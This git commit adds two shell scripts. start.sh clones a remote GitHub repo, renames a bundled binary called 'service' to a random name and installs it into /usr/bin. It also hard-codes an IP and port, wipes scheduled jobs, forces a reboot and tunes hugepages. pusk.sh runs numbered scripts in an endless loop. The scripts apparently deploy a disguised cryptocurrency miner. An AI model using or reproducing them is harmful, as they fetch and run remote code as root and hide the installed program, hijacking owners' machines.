93c550c09e18f6b89929ac0b9a5a8c2c6a976539
servicemi <52180716+servicemi@users.noreply.github.com>
2019-06-26 09:36:47 +0100

    Add files via upload

---
+++ pusk.sh
@@ -0,0 +1,17 @@
+#!/bin/sh
+echo "Start"
+while (true) 
+do
+ ./705.sh;
+ sleep 75; 
+  ./500.sh;
+ sleep 98; 
+   ./800.sh;
+ sleep 85; 
+   ./605.sh;
+ sleep 78; 
+   ./900.sh;
+ sleep 69; 
+  ./400.sh;
+ sleep 99; 
+done;
---
+++ start.sh
@@ -0,0 +1,37 @@
+#!/bin/bash
+IPADR="95.216.187.139:4500"
+MNRCO="nopfhkj"
+
+ID="$(hostname)"
+THREADS="$(nproc --all)"
+
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo echo 'sudo reboot -f' | at now + 12 hours
+
+rm -rf /tmp/none/
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sudo apt-get install dos2unix
+sleep 2
+
+cd /tmp && mkdir none
+git clone https://github.com/nomonom/toropil.git /tmp/none
+cd /tmp/none
+chmod 777 ./*.sh
+mv service $MNRCO
+chmod +x /tmp/none/$MNRCO
+sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
+sleep 3
+sudo dos2unix pusk.sh
+sudo dos2unix checker.sh
+sudo dos2unix 75.sh
+sudo dos2unix 50.sh
+sudo dos2unix 80.sh
+sudo dos2unix 65.sh
+sudo dos2unix 90.sh
+sudo dos2unix 40.sh
+
+sudo ./pusk.sh & ./checker.sh
+
